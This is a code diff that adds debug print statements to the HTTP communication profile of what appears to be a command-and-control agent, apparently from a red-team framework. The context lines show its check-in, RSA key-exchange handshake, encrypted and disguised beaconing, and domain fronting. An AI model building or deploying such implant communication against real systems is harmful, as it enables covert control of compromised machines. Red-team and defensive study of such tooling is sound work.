@@ -41,6 +41,7 @@ namespace Agent.Profiles
 
         public HttpxProfile(IAgentConfig agentConfig, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
         {
+            Console.WriteLine("[HTTPX DEBUG] Constructor called");
             this.agentConfig = agentConfig;
             this.crypt = crypto;
             this.logger = logger;
@@ -94,6 +95,9 @@ namespace Agent.Profiles
             {
                 this._client.DefaultRequestHeaders.Host = this.domainFront;
             }
+            
+            Console.WriteLine("[HTTPX DEBUG] Constructor complete - config loaded successfully");
+            Console.WriteLine($"[HTTPX DEBUG] _uuidNegotiated = {_uuidNegotiated}");
         }
         
         private string decodeBase64Config(string configData)
@@ -150,11 +154,20 @@ namespace Agent.Profiles
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
+            Console.WriteLine("[HTTPX DEBUG] Checkin() called");
+            Console.WriteLine($"[HTTPX DEBUG] _uuidNegotiated = {_uuidNegotiated}");
+            Console.WriteLine($"[HTTPX DEBUG] Current UUID = {this.agentConfig.uuid}");
+            Console.WriteLine($"[HTTPX DEBUG] Checking if EKE needed: !_uuidNegotiated = {!_uuidNegotiated}");
+            
             // EKE Handshake - MANDATORY for Httpx profile
             if (!_uuidNegotiated)
             {
+                Console.WriteLine("[HTTPX DEBUG] Entering EKE handshake flow");
+                
                 // Generate 4096-bit RSA keypair
                 rsa = new RSAKeyPair(4096);
+                Console.WriteLine($"[HTTPX DEBUG] RSA keypair generated, SessionId = {rsa.SessionId}");
+                Console.WriteLine($"[HTTPX DEBUG] Public key length = {rsa.PublicKey.Length}");
                 
                 // Create EKE handshake message
                 EKEHandshake handshake = new EKEHandshake
@@ -166,7 +179,13 @@ namespace Agent.Profiles
                 
                 // Send handshake
                 string handshakeJson = JsonSerializer.Serialize(handshake, EKEHandshakeJsonContext.Default.EKEHandshake);
+                Console.WriteLine($"[HTTPX DEBUG] EKE handshake JSON created, length = {handshakeJson.Length}");
+                Console.WriteLine($"[HTTPX DEBUG] Handshake JSON: {handshakeJson.Substring(0, Math.Min(200, handshakeJson.Length))}...");
+                Console.WriteLine("[HTTPX DEBUG] Calling Send() for EKE handshake...");
+                
                 string handshakeResponse = await this.Send(handshakeJson);
+                Console.WriteLine($"[HTTPX DEBUG] Send() returned, response length = {handshakeResponse?.Length ?? 0}");
+                Console.WriteLine($"[HTTPX DEBUG] Response: {handshakeResponse?.Substring(0, Math.Min(200, handshakeResponse?.Length ?? 0))}...");
                 
                 if (!string.IsNullOrEmpty(handshakeResponse))
                 {
@@ -174,6 +193,10 @@ namespace Agent.Profiles
                     
                     if (ekeResp != null && !string.IsNullOrEmpty(ekeResp.session_key))
                     {
+                        Console.WriteLine("[HTTPX DEBUG] Session key decrypted successfully");
+                        Console.WriteLine($"[HTTPX DEBUG] New UUID from server: {ekeResp.uuid}");
+                        Console.WriteLine("[HTTPX DEBUG] Updating crypto manager...");
+                        
                         // Decrypt the session key using our RSA private key
                         byte[] encryptedKey = Convert.FromBase64String(ekeResp.session_key);
                         byte[] sessionKey = rsa.RSA.Decrypt(encryptedKey, true);
@@ -184,14 +207,17 @@ namespace Agent.Profiles
                         this.agentConfig.uuid = ekeResp.uuid;
                         
                         _uuidNegotiated = true;
+                        Console.WriteLine("[HTTPX DEBUG] Crypto manager updated, _uuidNegotiated = true");
                     }
                     else
                     {
+                        Console.WriteLine("[HTTPX DEBUG] EKE handshake FAILED - returning failed status (no session_key)");
                         return new CheckinResponse() { status = "failed" };
                     }
                 }
                 else
                 {
+                    Console.WriteLine("[HTTPX DEBUG] EKE handshake FAILED - returning failed status (empty response)");
                     return new CheckinResponse() { status = "failed" };
                 }
             }
@@ -261,8 +287,13 @@ namespace Agent.Profiles
         {
             try
             {
+                Console.WriteLine($"[HTTPX DEBUG] Send() called, json length = {json.Length}");
+                Console.WriteLine($"[HTTPX DEBUG] JSON (first 100 chars): {json.Substring(0, Math.Min(100, json.Length))}...");
+                
                 // Encrypt the message
                 json = this.crypt.Encrypt(json);
+                Console.WriteLine($"[HTTPX DEBUG] After encryption, json length = {json.Length}");
+                
                 byte[] messageBytes = Encoding.UTF8.GetBytes(json);
 
                 // Select HTTP method variation based on message size
@@ -283,14 +314,19 @@ namespace Agent.Profiles
                         variation = config.GetVariation("post");
                     }
                 }
+                
+                Console.WriteLine($"[HTTPX DEBUG] Selected HTTP method: {variation.Verb}, message size: {messageBytes.Length}");
 
                 // Apply client transforms
                 byte[] transformedData = TransformChain.ApplyClientTransforms(messageBytes, variation.Client.Transforms);
+                Console.WriteLine($"[HTTPX DEBUG] After transforms, data length = {transformedData.Length}");
 
                 // Build URL
                 string domain = getCurrentDomain();
                 string uri = variation.Uris[random.Next(variation.Uris.Count)];
                 string url = domain + uri;
+                Console.WriteLine($"[HTTPX DEBUG] Sending {variation.Verb} request to: {url}");
+                Console.WriteLine($"[HTTPX DEBUG] Message location: {variation.Client.Message.Location}");
 
                 // Handle message placement
                 string queryParam = "";
@@ -348,6 +384,8 @@ namespace Agent.Profiles
 
                 // Send request
                 HttpResponseMessage response = await this._client.SendAsync(request, cancellationTokenSource.Token);
+                Console.WriteLine($"[HTTPX DEBUG] HTTP response status: {response.StatusCode}");
+                
                 response.EnsureSuccessStatusCode();
 
                 // Handle success
@@ -355,6 +393,7 @@ namespace Agent.Profiles
 
                 // Read response
                 byte[] responseBytes = await response.Content.ReadAsByteArrayAsync();
+                Console.WriteLine($"[HTTPX DEBUG] Response length: {responseBytes.Length}");
                 
                 // Apply server transforms (reverse)
                 byte[] untransformedData = TransformChain.ApplyServerTransforms(responseBytes, variation.Server.Transforms);
@@ -364,8 +403,11 @@ namespace Agent.Profiles
                 // Decrypt
                 return this.crypt.Decrypt(responseString);
             }
-            catch
+            catch (Exception ex)
             {
+                Console.WriteLine($"[HTTPX DEBUG] Send() exception: {ex.GetType().Name}");
+                Console.WriteLine($"[HTTPX DEBUG] Exception message: {ex.Message}");
+                Console.WriteLine($"[HTTPX DEBUG] Stack trace: {ex.StackTrace}");
                 handleDomainFailure();
                 return String.Empty;
             }
